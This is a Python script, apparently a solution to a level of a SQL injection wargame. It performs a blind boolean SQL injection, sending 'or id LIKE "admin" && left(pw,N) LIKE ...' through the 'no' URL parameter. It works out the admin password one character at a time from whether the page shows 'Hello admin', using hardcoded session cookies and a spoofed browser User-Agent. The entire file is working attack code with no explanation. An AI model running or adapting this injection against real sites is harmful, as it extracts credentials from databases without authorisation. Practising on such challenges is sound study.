import http
import http.client
import http.server
import http.cookies
import urllib
import urllib.request
import urllib.response
import urllib.parse
import urllib.error


MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
'Accept-Encoding': 'none',
'Accept-Language': 'en-US,en;q=0.8',
'Connection': 'keep-alive'}
MyCookies = {'PHPSESSID': '68jotprn1p8enuiqjd12ahvgs7','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url='http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=asdf&no=1 or id LIKE "admin" %26%26 left(pw,{0}) LIKE "{password}{ascii}"'.format(i,password=pw,ascii=arr[j])
		r = urllib.request.Request(url,headers=MyHeader)
		r.add_header("Cookie","PHPSESSID=ptu00rf0ggnk22t8t3gcdf9132")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)